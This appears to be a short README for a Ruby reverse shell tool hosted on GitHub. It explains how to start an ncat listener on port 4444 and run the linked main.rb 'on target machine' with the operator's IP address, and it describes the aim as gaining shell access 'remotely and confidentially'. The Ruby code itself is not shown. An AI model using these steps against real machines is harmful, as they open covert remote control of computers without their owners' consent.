# Ruby Reverse shell
reverse shell is the act of accessing a shell remotely and confidentially.

# Mode of use
- open a port using ncat, as an example, I will use port 4444
```
ncat -lvp 4444
```
start the file <a href="https://github.com/brUc3r/revshell_ruby/blog/main/main.rb">main.rb</a> on target machine
with these parameters:

```python
ruby main.rb YOUR IP 4444
```
> you can use ifconfig command to see your IP.

